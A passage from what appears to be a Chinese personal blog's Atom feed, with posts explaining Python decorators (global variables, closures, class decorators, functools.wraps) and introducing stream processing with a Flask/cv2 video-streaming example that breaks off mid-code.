，阶下有人在仰望你，阶上亦有人在俯视你；</strong><br><strong>你抬头自卑，低头自得，唯有平视，才能看到真实的自已。</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;一些基本概念&quot;&gt;&lt;a href=&quot;#一些基本概念&quot; class=&quot;headerlink&quot; title=&quot;一些基本概念&quot;&gt;&lt;/a&gt;一些基本概念&lt;/h4&gt;&lt;p&gt;旁站：是和目标网站在同一台服务器上的其它的网站。&lt;br&gt;C段：是和目标服务器ip处在同一个C段的其它服务器。</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python</title>
    <link href="https://liu1272.github.io/2023/03/19/Python/"/>
    <id>https://liu1272.github.io/2023/03/19/Python/</id>
    <published>2023-03-18T16:55:10.741Z</published>
    <updated>2023-03-18T16:55:15.984Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <id>https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</id>
    <published>2023-03-18T16:54:25.000Z</published>
    <updated>2023-03-18T16:55:05.472Z</updated>
    
    <content type="html"><![CDATA[<p>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>是的，Python装饰器里可以使用 <code>global</code> 关键字。 </p><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。如果您希望在装饰器内部更改全局变量的值，则需要在函数内部将变量声明为全局变量。在 Python 中，您可以使用 <code>global</code> 关键字来实现这一点。</p><p>以下是一个示例装饰器，它使用全局变量来记录函数调用次数：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们使用 <code>global</code> 关键字声明了 <code>count</code> 变量，并在 <code>count_calls</code> 装饰器函数的 <code>wrapper</code> 函数内部对其进行了修改。每次调用 <code>my_function</code> 函数时，装饰器都会增加 <code>count</code> 的值，并打印出调用次数。除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值。下面是一个示例：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量。由于内部函数可以访问外部函数的变量，因此可以通过闭包的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    count <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们在装饰器函数 <code>count_calls</code> 内部定义了一个内部函数 <code>decorator</code>，并在该函数中定义了变量 <code>count</code>。在 <code>wrapper</code> 函数内部，我们使用 <code>nonlocal</code> 关键字来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><ol start="2"><li>使用类：将装饰器实现为一个类，并在类中引用外部变量。由于类实例可以存储变量状态，因此可以通过类的方式在装饰器内部使用外部变量。例如：</li></ol><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">CountCalls</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> func<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>func <span class="token operator">=</span> func        self<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">def</span> <span class="token function">__call__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;self.func.__name__&amp;#125; has been called &amp;#123;self.count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>@CountCalls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们定义了一个类 <code>CountCalls</code>，并在类的构造函数中定义了变量 <code>count</code>。在 <code>__call__</code> 方法中，我们使用 <code>self.count</code> 来引用 <code>count</code> 变量，并在每次调用被装饰的函数时增加其值。</p><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。选择哪种方法取决于具体的需求和个人偏好。除了在装饰器中使用 <code>global</code> 关键字或闭包或类等方式引用外部变量，还可以将变量作为参数传递给装饰器。这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。以下是一个示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>            nonlocal count            count <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">return</span> wrapper    <span class="token keyword">return</span> decorator@count_calls<span class="token punctuation">(</span>count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们将变量 <code>count</code> 作为参数传递给 <code>count_calls</code> 装饰器，并在装饰器函数 <code>decorator</code> 内部使用 <code>nonlocal</code> 关键字引用该变量。在每次调用被装饰的函数时，我们都会增加 <code>count</code> 的值，并打印出该函数被调用的次数。</p><p>需要注意的是，通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><p>以下是一个使用 <code>wraps</code> 装饰器的示例：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> functools <span class="token keyword">import</span> wraps<span class="token keyword">def</span> <span class="token function">my_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    @wraps<span class="token punctuation">(</span>func<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""This is a wrapper function."""</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Before the function is called."</span><span class="token punctuation">)</span>        result <span class="token operator">=</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"After the function is called."</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> result    <span class="token keyword">return</span> wrapper@my_decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""This is a function."""</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个示例中，我们使用 <code>wraps</code> 装饰器来保留被装饰函数 <code>my_function</code> 的元信息，包括其名称、文档字符串等。这使得被装饰函数的调试和理解更加容易。需要注意的是，在使用 <code>wraps</code> 装饰器时，需要将其放在装饰器函数的内部，而不是外部。</p><p>总之，通过在装饰器中使用 <code>wraps</code> 装饰器，我们可以保留被装饰函数的元信息，从而提高代码的可读性和可维护性。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;当在装饰器中使用全局变量时，需要注意以下几点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;在装饰器中声明全局变量需要使用&lt;code&gt;global&lt;/code&gt;关键字。&lt;/li&gt;
&lt;li&gt;在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发&lt;code&gt;NameError&lt;/c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/"/>
    <id>https://liu1272.github.io/2023/03/19/Python%E8%A3%85%E9%A5%B0%E5%99%A8/</id>
    <published>2023-03-18T16:50:00.000Z</published>
    <updated>2023-03-18T16:54:07.865Z</updated>
    
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>Python装饰器&amp;流处理技术</title>
    <link href="https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/"/>
    <id>https://liu1272.github.io/2023/03/18/Python%E8%A3%85%E9%A5%B0%E5%99%A8-%E6%B5%81%E5%A4%84%E7%90%86%E6%8A%80%E6%9C%AF/</id>
    <published>2023-03-17T16:56:00.000Z</published>
    <updated>2023-03-18T17:26:43.963Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python装饰器"><a href="#Python装饰器" class="headerlink" title="Python装饰器"></a>Python装饰器</h3><h4 id="解释概念"><a href="#解释概念" class="headerlink" title="解释概念"></a>解释概念</h4><p>Python中的装饰器是一种用于修改或扩展函数或类的行为的语法结构。装饰器通常是一个函数或类，它接受一个函数或类作为参数，并返回一个新的函数或类。</p><p>装饰器可以用于许多不同的目的，例如：</p><ol><li>添加日志记录或调试信息，以便跟踪函数的执行过程和结果。</li><li>对函数或类的参数进行验证或修改，以确保它们符合特定的规则或格式。</li><li>对函数或类进行缓存或记忆化，以避免重复计算或提高性能。</li><li>添加身份验证或授权逻辑，以确保只有授权用户才能调用函数或类。</li><li>实现面向切面编程（AOP），以分离横切关注点（如日志记录、性能统计等）和业务逻辑。<br>Python中的装饰器使用@语法来应用，例如：<pre class="line-numbers language-python"><code class="language-python">@decorator<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># do something</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>这将把<code>my_function</code>函数传递给<code>decorator</code>装饰器函数，并将其替换为新的函数，该函数包装了原始函数并修改了其行为。</li></ol><h4 id="关于装饰器全局变量的使用（接口）"><a href="#关于装饰器全局变量的使用（接口）" class="headerlink" title="关于装饰器全局变量的使用（接口）"></a>关于装饰器全局变量的使用（接口）</h4><p>装饰器本质上是一个函数，因此它可以访问任何全局变量。<br>当在装饰器中使用全局变量时，需要注意以下几点：</p><ol><li>在装饰器中声明全局变量需要使用<code>global</code>关键字。</li><li>在装饰器中使用全局变量，需要确保该变量已经被定义和初始化，否则会引发<code>NameError</code>异常。</li><li>全局变量可能会被多个线程或进程访问，因此需要考虑并发安全问题。</li><li>在装饰器中使用全局变量可能会导致代码的可读性和可维护性降低，因此应尽可能避免使用全局变量。<br>以下是一个简单的例子，演示如何在装饰器中使用全局变量：<pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">counter</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">global</span> count     count <span class="token operator">+=</span> <span class="token number">1</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; was called &amp;#123;count&amp;#125; times."</span><span class="token punctuation">)</span>     <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token keyword">return</span> wrapper@counter<span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello, world!"</span><span class="token punctuation">)</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 1 times.</span>foo<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># Function foo was called 2 times.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>在上面的例子中，我们定义了一个全局变量<code>count</code>，并在装饰器<code>counter</code>中使用了它。<br>装饰器<code>counter</code>用于统计函数被调用的次数，每次调用时<code>count</code>加1，并输出调用次数。<br>函数<code>foo</code>被装饰后，每次调用都会输出调用次数。</li></ol><p>除了在装饰器函数内部使用 <code>global</code> 关键字，还可以在装饰器函数外部使用 <code>global</code> 关键字来声明全局变量，并在装饰器内部访问和修改该变量的值：</p><pre class="line-numbers language-python"><code class="language-python">count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">count_calls</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">global</span> count        count <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">"Function &amp;#123;func.__name__&amp;#125; has been called &amp;#123;count&amp;#125; times"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>    <span class="token keyword">return</span> wrapper@count_calls<span class="token keyword">def</span> <span class="token function">my_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> count    <span class="token keyword">if</span> count <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello World!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hi there!"</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span>my_function<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在这个例子中，我们声明了全局变量 <code>count</code>，并在装饰器内部和外部使用了 <code>global</code> 关键字。<br>在 <code>my_function</code> 函数内部，我们检查 <code>count</code> 的值是否为偶数，并打印不同的消息。<br>由于装饰器在每次调用 <code>my_function</code> 函数时都会增加 <code>count</code> 的值，因此 <code>my_function</code> 函数每次都会打印不同的消息。</p><p>需要注意的是，在使用全局变量时要小心，因为全局变量可能会在代码中的任何地方进行修改，这可能会导致出现意外的行为。<br>因此，最好将全局变量用于只读目的，或者在使用时采用适当的同步机制来避免竞争条件。<br>当然，除了 <code>global</code> 关键字之外，还可以使用其他的方式来在装饰器中引用外部变量。以下是一些常用的方法：</p><ol><li>使用闭包：在装饰器函数内部定义一个内部函数，并在内部函数中引用外部变量<br>（由于内部函数可以访问外部函数的变量）</li><li>使用类：将装饰器实现为一个类，并在类中引用外部变量<br>（由于类实例可以存储变量状态）</li></ol><p>无论是使用 <code>global</code> 关键字、闭包还是类，都可以在装饰器中引用外部变量。<br>除了上面所提到的方法，还可以将变量作为参数传递给装饰器。<br>这种方式通常适用于装饰器函数需要访问某些变量，但不希望将这些变量声明为全局变量的情况。</p><p>通过将变量作为参数传递给装饰器，我们可以更灵活地控制装饰器的行为，但同时也会增加代码的复杂度。因此，在选择使用这种方式时，需要权衡利弊，并根据具体的情况选择最适合的实现方式。</p><p>除了在装饰器中使用 <code>global</code> 关键字、闭包、类或参数等方式引用外部变量之外，还可以使用 <code>functools</code> 模块中的 <code>wraps</code> 装饰器来保留被装饰函数的元信息。<br>具体来说，<code>wraps</code> 装饰器可以用来保留被装饰函数的名称、文档字符串、参数签名等元信息，从而使得被装饰函数更加易于调试和理解。</p><h3 id="流处理技术"><a href="#流处理技术" class="headerlink" title="流处理技术"></a>流处理技术</h3><h4 id="概念解析"><a href="#概念解析" class="headerlink" title="概念解析"></a>概念解析</h4><p>流处理技术是一种处理数据的方式，它是指持续接收和处理流式数据的方式。<br>与批处理不同，流处理将数据视为连续的数据流，而不是离散的数据集合。</p><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><p>流处理技术的主要用途是实时分析和处理数据。<br>通过流处理技术，可以快速处理大量的<code>实时数据</code>，并从中提取有价值的信息。<br>流处理技术通常使用流处理引擎来实现，流处理引擎通常提供一系列的API和工具。<br>用于处理数据流、实时处理和聚合数据、分析数据和发送数据到其他系统。<br>流处理引擎还可以与其他系统和工具集成，例如数据库、数据仓库、消息队列等。</p><h4 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h4><p>在使用流处理技术时，需要考虑以下几个方面：<br>（1）数据来源和输入方式：从不同的数据源中读取实时数据流。<br>（2）流处理引擎的选择：根据具体的业务需求和系统架构选择适合的流处理引擎。<br>&emsp;&emsp;(Apache Flink、Apache Kafka Streams、Apache Spark Streaming等)<br>（3）数据处理逻辑：定义数据处理逻辑。<br>（4）数据输出方式：传输和存储处理后的数据。</p><h4 id="简单的示例"><a href="#简单的示例" class="headerlink" title="简单的示例"></a>简单的示例</h4><p>下面是个使用Flask和cv2框架编写的一个用于播放视频的Python流处理脚本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> Response<span class="token keyword">import</span> cv2app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>camera <span class="token operator">=</span> cv2<span class="token punctuation">.</span>VideoCapture<span class="token punctuation">(</span><span class="token string">"1.mp4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">generate_frames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        success<span class="token punctuation">,</span> frame <span class="token operator">=</span> camera<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> success<span class="token punctuation">:</span>            ret<span class="token punctuation">,</span> buffer <span class="token operator">=</span> cv2<span class="token punctuation">.</span>imencode<span class="token punctuation">(</span><span class="token string">'.jpg'</span><span class="token punctuation">,</span> frame<span class="token punctuation">)</span>            frame <span class="token operator">=</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">yield</span> <span class="token punctuation">(</span>b<span class="token string">'--frame\r\nContent-Type: image/jpeg\r\n\r\n'</span> <span class="token operator">+</span> buffer<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token string">'\r\n'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">video_feed</span><span class="token 